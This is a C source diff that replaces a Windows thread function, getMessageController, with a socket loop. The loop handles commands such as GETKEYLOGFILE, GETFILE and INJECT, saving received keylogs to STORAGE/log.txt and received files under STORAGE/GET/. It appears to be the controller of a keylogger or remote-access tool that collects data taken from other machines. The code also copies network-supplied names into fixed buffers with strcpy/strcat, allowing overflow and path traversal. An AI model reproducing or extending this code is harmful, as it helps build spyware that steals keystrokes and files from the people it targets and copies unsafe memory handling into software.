@@ -339,6 +339,7 @@ return	mkdir(tmp, 0777);
 
 
 #ifdef _WIN32
+/*
 DWORD WINAPI getMessageController(LPVOID paramT){
 	char server_reply[1000000] = {0};
 
@@ -362,6 +363,98 @@ DWORD WINAPI getMessageController(LPVOID paramT){
 		Sleep(10);
 	}
 	return 0;
+}
+*/
+DWORD WINAPI getMessageController(LPVOID paramV){
+    printf("INSIDE getMessage\n");
+    char buffer[1024] = {0};
+    int pass = 0;
+
+    paramThread *param = (paramThread *)paramV;
+    unsigned char GETFILE = 0; // 0: normal, 1: copying file, 2: getting filename
+    FILE *fp = NULL;
+    char pathBuffer[256] = {0};
+    int i = 0;
+
+    while(1){
+        if((param)->socketStatus == 's' || (param)->socketStatus == 'c'){
+            pass = recv((param)->clientSocket, buffer, sizeof(buffer) - 1, 0);
+            if(pass > 0){
+                buffer[pass] = '\0';  // Null-terminate received data
+                
+                if(strcmp(buffer, "GETKEYLOGFILE") == 0) {
+                    GETFILE = 1; 
+                    memset(buffer, '\0', sizeof(buffer));
+                    fp = fopen("STORAGE/log.txt", "w");
+                    continue;
+                } else if(strcmp(buffer, "GETFILE") == 0) {
+                    printf("\nGETFILE = 2\n");
+                    GETFILE = 2; 
+                    memset(buffer, '\0', sizeof(buffer));
+                    continue;
+                } else if(strcmp(buffer, "ENDGETFILE") == 0) {
+                    GETFILE = 0; 
+                    memset(buffer, '\0', sizeof(buffer));
+                    if(fp) {
+                        fclose(fp);
+                        fp = NULL;
+                    }
+                    continue;
+                } else if(strcmp(buffer, "INJECT") == 0) {
+                    GETFILE = 51; 
+                    openFolder("./STORAGE/INJECT");
+                    continue;
+                }
+
+                if(GETFILE == 0) {
+                    printf("%s\n", buffer);
+                } else if(GETFILE == 1) {
+                    printf("%s\n", buffer);
+                    if(fp) fputs(buffer, fp);
+                } else if(GETFILE == 2) {
+                    printf("\nGETFILE = 1\n");
+                    char buffer2[128] = {0};
+                    strcpy(buffer2, "STORAGE/GET/");
+                    strcat(buffer2, buffer);
+                    fp = fopen(buffer2, "w");
+                    GETFILE = 1;
+                    continue;
+                } else if(GETFILE == 3) {
+                    strcpy(pathBuffer, "STORAGE/GET/");
+                    strcat(pathBuffer, buffer);
+                    if (mkdir_recursive(pathBuffer) == 0) {
+                        printf("Folder '%s' berhasil dibuat.\n", buffer);
+                    } else {
+                        perror("Gagal membuat folder");
+                    }
+                    GETFILE = 0; 
+                    continue;
+                } else if(GETFILE == 51) {
+                    strcpy(pathBuffer, "./STORAGE/INJECT/");
+                    // Additional handling can be added here if needed
+                }
+
+                memset(buffer, '\0', sizeof(buffer));
+            } else if(pass == 0) {
+                // Disconnection or error
+                if((param)->socketStatus == 's'){
+                    closesocket((param)->clientSocket);
+                    (param)->clientSocket = INVALID_SOCKET;
+                } else if((param)->socketStatus == 'c' || (param)->socketStatus == 'C'){
+                    (param)->socketStatus = 'x';
+                } else {
+                    return 0;
+                }
+            }
+        }
+        i++;
+        if(i == 100){
+            i=0; 
+            printf("CONNECTING\n");
+        }
+        Sleep(10); // wait 10 milliseconds
+    }
+    return 0;
 }
 #else
 void * getMessageController (void * vParam){
